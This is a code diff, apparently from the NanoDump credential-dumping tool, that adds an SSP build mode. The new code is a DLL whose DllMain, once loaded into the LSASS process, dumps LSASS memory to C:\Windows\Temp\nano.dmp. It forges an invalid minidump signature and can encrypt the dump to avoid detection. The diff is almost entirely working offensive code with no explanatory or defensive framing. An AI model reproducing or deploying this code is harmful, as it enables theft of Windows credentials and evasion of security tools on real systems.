@@ -212,7 +212,7 @@ void go(char* args, int length)
     );
 }
 
-#else
+#elif defined(PE)
 
 void usage(char* procname)
 {
@@ -544,6 +544,103 @@ int main(int argc, char* argv[])
         );
     }
     return 0;
+}
+
+#elif defined(SSP)
+
+#include "ssp.h"
+
+BOOL NanoDump(void)
+{
+    LPCSTR  dump_path = "C:\\Windows\\Temp\\nano.dmp";
+    ULONG32 Signature;
+    SHORT   Version;
+    SHORT   ImplementationVersion;
+    BOOL    success;
+    BOOL    use_valid_sig = FALSE;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING full_dump_path;
+    full_dump_path.Buffer = wcFilePath;
+    full_dump_path.Length = 0;
+    full_dump_path.MaximumLength = 0;
+
+    get_full_path(&full_dump_path, dump_path);
+
+    if (!create_file(&full_dump_path))
+        return FALSE;
+
+    // set the signature
+    if (use_valid_sig)
+    {
+        Signature = MINIDUMP_SIGNATURE;
+        Version = MINIDUMP_VERSION;
+        ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    }
+    else
+    {
+        generate_invalid_sig(
+            &Signature,
+            &Version,
+            &ImplementationVersion
+        );
+    }
+
+    // we are LSASS after all :)
+    HANDLE hProcess = NtCurrentProcess();
+
+    // allocate a chuck of memory to write the dump
+    SIZE_T region_size = DUMP_MAX_SIZE;
+    PVOID base_address = allocate_memory(&region_size);
+    if (!base_address)
+        return FALSE;
+
+    dump_context dc;
+    dc.hProcess = hProcess;
+    dc.BaseAddress = base_address;
+    dc.rva = 0;
+    dc.DumpMaxSize = region_size;
+    dc.Signature = Signature;
+    dc.Version = Version;
+    dc.ImplementationVersion = ImplementationVersion;
+
+    success = NanoDumpWriteDump(&dc);
+    if (!success)
+        return FALSE;
+
+    // at this point, you can encrypt or obfuscate the dump
+    encrypt_dump(&dc);
+
+    success = write_file(
+        &full_dump_path,
+        dc.BaseAddress,
+        dc.rva
+    );
+    if (!success)
+        return FALSE;
+
+    erase_dump_from_memory(&dc);
+
+    return TRUE;
+}
+
+__declspec(dllexport) BOOL APIENTRY DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved
+)
+{
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            NanoDump();
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return FALSE;
 }
 
 #endif
